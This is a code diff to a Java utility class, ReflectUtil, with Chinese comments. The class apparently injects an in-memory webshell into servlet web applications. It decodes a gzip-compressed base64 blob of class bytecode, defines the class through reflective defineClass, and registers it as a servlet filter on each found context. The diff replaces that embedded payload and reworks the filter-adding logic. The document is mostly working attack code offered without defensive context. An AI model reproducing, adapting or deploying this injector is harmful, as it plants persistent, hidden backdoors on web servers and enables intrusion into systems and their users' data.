@@ -28,11 +28,12 @@ public class ReflectUtil {
     }
 
     public String getClassName() {
-        return "xxx";
+        // 放置完整的类名
+        return "KpLi0rn2";
     }
 
     public String getBase64String() throws IOException {
-        return new String("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");
+        return new String("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");
 
     }
 
@@ -46,10 +47,9 @@ public class ReflectUtil {
                 System.out.println("Context: "+context);
                 Object filter = this.getFilter(context);
                 System.out.println("Filter: "+filter);
-                this.addFilter(context, filter);
-                if (filter!=null){
-                    System.out.println("if filter:"+filter);
-                    break;
+                if (filter != null) {
+                    System.out.println("addFilter: "+filter);
+                    this.addFilter(context, filter);
                 }
             }
         } catch (Exception var5) {
@@ -113,11 +113,12 @@ public class ReflectUtil {
         if (classLoader == null) {
             classLoader = context.getClass().getClassLoader();
         }
-        System.out.println("flag");
+
         try {
             filter = classLoader.loadClass(this.getClassName());
             System.out.println("getFilter: "+filter);
         } catch (Exception var9) {
+            System.out.println("1 catch");
             try {
                 byte[] clazzByte = gzipDecompress(decodeBase64(this.getBase64String()));
                 // 不解压缩方案 有问题，原因未知
@@ -127,7 +128,6 @@ public class ReflectUtil {
                 Class clazz = (Class)defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                 filter = clazz.newInstance();
                 System.out.println("createFilter: "+filter);
-                var9.printStackTrace();
             } catch (Throwable var8) {
                 var8.printStackTrace();  // 打印异常信息
             }
